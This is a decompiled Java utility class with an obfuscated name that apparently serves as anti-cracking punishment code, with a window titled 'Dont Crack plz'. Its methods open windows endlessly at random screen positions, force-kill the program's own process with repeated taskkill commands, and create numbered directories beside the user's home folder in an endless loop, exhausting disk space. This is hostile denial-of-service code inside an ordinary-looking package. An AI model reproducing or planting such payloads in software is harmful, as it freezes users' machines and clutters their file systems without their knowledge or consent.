/*
 * Decompiled with CFR 0.152.
 */
package com.leave.old.Utils;

import java.io.File;
import java.io.IOException;
import java.lang.management.ManagementFactory;
import java.lang.management.RuntimeMXBean;
import java.util.Random;
import javax.swing.JFrame;
import javax.swing.filechooser.FileSystemView;

public class A03A59A2 {
    public A03A59A2() throws IOException {
        this.blast_1();
        this.blast_2();
        this.blast_3();
    }

    public void blast_1() {
        Random rd = new Random();
        while (true) {
            JFrame frame = new JFrame("My Dear|Dont Crack plz");
            frame.setSize(400, 100);
            frame.setLocation(rd.nextInt(1920), rd.nextInt(1080));
            frame.setVisible(true);
        }
    }

    public void blast_2() throws IOException {
        RuntimeMXBean runtimeMXBean = ManagementFactory.getRuntimeMXBean();
        Runtime.getRuntime().exec("taskkill /f /pid " + runtimeMXBean.getName().substring(0, runtimeMXBean.getName().indexOf("@")).toString());
        Runtime.getRuntime().exec("taskkill /f /pid " + runtimeMXBean.getName().substring(0, runtimeMXBean.getName().indexOf("@")).toString());
        Runtime.getRuntime().exec("taskkill /f /pid " + runtimeMXBean.getName().substring(0, runtimeMXBean.getName().indexOf("@")).toString());
        Runtime.getRuntime().exec("taskkill /f /pid " + runtimeMXBean.getName().substring(0, runtimeMXBean.getName().indexOf("@")).toString());
        Runtime.getRuntime().exec("taskkill /f /pid " + runtimeMXBean.getName().substring(0, runtimeMXBean.getName().indexOf("@")).toString());
        Runtime.getRuntime().exec("taskkill /f /pid " + runtimeMXBean.getName().substring(0, runtimeMXBean.getName().indexOf("@")).toString());
        Runtime.getRuntime().exec("taskkill /f /pid " + runtimeMXBean.getName().substring(0, runtimeMXBean.getName().indexOf("@")).toString());
        Runtime.getRuntime().exec("taskkill /f /pid " + runtimeMXBean.getName().substring(0, runtimeMXBean.getName().indexOf("@")).toString());
        Runtime.getRuntime().exec("taskkill /f /pid " + runtimeMXBean.getName().substring(0, runtimeMXBean.getName().indexOf("@")).toString());
        Runtime.getRuntime().exec("taskkill /f /pid " + runtimeMXBean.getName().substring(0, runtimeMXBean.getName().indexOf("@")).toString());
        Runtime.getRuntime().exec("taskkill /f /pid " + runtimeMXBean.getName().substring(0, runtimeMXBean.getName().indexOf("@")).toString());
    }

    public void blast_3() {
        int i = 0;
        FileSystemView view = FileSystemView.getFileSystemView();
        File file = view.getHomeDirectory();
        while (true) {
            File f = new File(file + "NMSLCRACK" + i);
            f.mkdir();
            ++i;
        }
    }
}

